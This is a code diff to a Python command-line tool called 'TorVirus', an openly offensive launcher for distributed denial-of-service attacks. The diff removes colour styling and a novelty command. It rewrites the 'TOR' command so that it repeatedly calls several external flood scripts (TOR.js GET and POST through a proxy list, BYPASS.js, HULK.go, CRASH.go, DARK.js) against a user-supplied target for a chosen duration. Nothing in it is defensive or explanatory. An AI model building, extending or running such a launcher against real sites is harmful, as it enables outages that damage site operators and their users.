@@ -2,7 +2,6 @@ import os
 import time
 import sys
 import random
-from pystyle import Colors, Colorate, Center
 
 def progress(curr, total, bl=30):
     filled = int(bl * curr // total)
@@ -26,19 +25,19 @@ def load_proxies(fp='proxy.txt'):
 def display_stats():
     uptime = int(time.time() - session_start)
     mins, secs = divmod(uptime, 60)
-    print(Colorate.Horizontal(Colors.blue_to_purple, f'''
+    print(f'''
     🖥️ TorVirus DASHBOARD 🖥️
     | 🛰️ Bots Online: {bc}
     | ⏳ Uptime: {mins}m {secs}s
     | 📈 Success Rate: {random.randint(85, 99)}%
     | 🔗 Network Strength: {random.choice(["Strong", "Moderate", "Weak"])}
     | ⚠️ Threat Level: {random.choice(["🟢 Low", "🟡 Medium", "🔴 High"])}
-    '''))
+    ''')
 
 def matrix_fall(d=3):
     start = time.time()
     while time.time() - start < d:
-        print(Colorate.Vertical(Colors.green_to_white, ''.join(random.choice('01 ') for _ in range(80))))
+        print(''.join(random.choice('01 ') for _ in range(80)))
         time.sleep(0.1)
 
 def welcome_msg(bc, st):
@@ -48,23 +47,10 @@ def welcome_msg(bc, st):
     matrix_fall(2)
     clear()
 
-def rgb_gradient(text, start_color, end_color):
-    gradient_text = ""
-    steps = len(text)
-    
-    for i in range(steps):
-        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / steps))
-        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / steps))
-        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / steps))
-        
-        gradient_text += f"\033[38;2;{r};{g};{b}m{text[i]}\033[0m"
-    
-    return gradient_text
-
 def display_menu():
     clear()
     welcome_msg(bc, session_time())
-    print(Colorate.Horizontal(Colors.red_to_white, '''
+    print('''  
   _____      __   ___
  |_   _|__ _ \ \ / (_)_ _ _  _ ___
    | |/ _ \ '_\ V /| | '_| || (_-<
@@ -75,7 +61,7 @@ def display_menu():
 
     !TOR     - Launch TOR-based DDoS
       TOR https://example.com 120
-'''))
+''')
 
 def load_anim(text, dur=1.5):
     frames = ['◐', '◓', '◑', '◒']
@@ -110,7 +96,7 @@ def session_time():
 def main_loop():
     display_menu()
     while True:
-        user_input = input(Colorate.Diagonal(Colors.red_to_white, "root@torvirus#~ ")).strip()
+        user_input = input("root@torvirus#~ ").strip()
         if not user_input:
             continue
         cmd_parts = user_input.split()
@@ -119,30 +105,38 @@ def main_loop():
             clear()
             display_stats()
             continue
-        if cmd == "HACKTHEWORLD":
-            clear()
-            load_anim("Accessing Global Data Vaults", 2)
-            print(Colorate.Horizontal(Colors.green_to_blue, "🌍 You've unlocked Global Hacktivist Mode 💻"))
-            continue
         elif cmd in ["CLEAR", "CLS"]:
             load_anim("Purging Console", 1.5)
             display_menu()
         elif cmd == "TOR":
             try:
                 host = cmd_parts[1]
-                at_dur = int(cmd_parts[2])
-                load_anim(f"Launching {cmd} Attack on {host}", 2)
-                anim_text(f"Engaging Attack on {host} for {at_dur} seconds... 💥", 0.05)
-                os.system(f'node TOR.js GET "{host}" {at_dur} 16 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
+                total_time = int(cmd_parts[2])
+                attack_time = 120
+                start_time = time.time()
+
+                anim_text(f"Engaging Attack on {host} for {total_time} seconds... 💥", 0.05)
+
+                while time.time() - start_time < total_time:
+                    os.system(f'node TOR.js GET "{host}" {attack_time} 50 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
+                    os.system(f'node TOR.js POST "{host}" {attack_time} 50 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
+                    os.system(f'node BYPASS.js {host} {attack_time} 32 50 proxy.txt')
+                    os.system(f'go run HULK.go --site {host} --data GET')
+                    os.system(f'go run CRASH.go {host} 9999 get {attack_time} nil')
+                    os.system(f'node DARK.js GET {host} {attack_time} 32 50 proxy.txt')
+
+                    time.sleep(1)
+
             except IndexError:
                 print('❌ Invalid Command. Usage: METHOD URL TIME')
                 print('Example: TOR https://example.com 120')
+
         elif cmd == "HELP":
             load_anim("Loading Help Interface", 1.5)
-            print(Colorate.Horizontal(Colors.red_to_white, '''
+            print('''
 HELP - For Assistance
 CLEAR - Clear Terminal
-'''))
+''')
         else:
             print(f"❌ Command [ {cmd} ] not recognized. Please try again! 🚨")
 
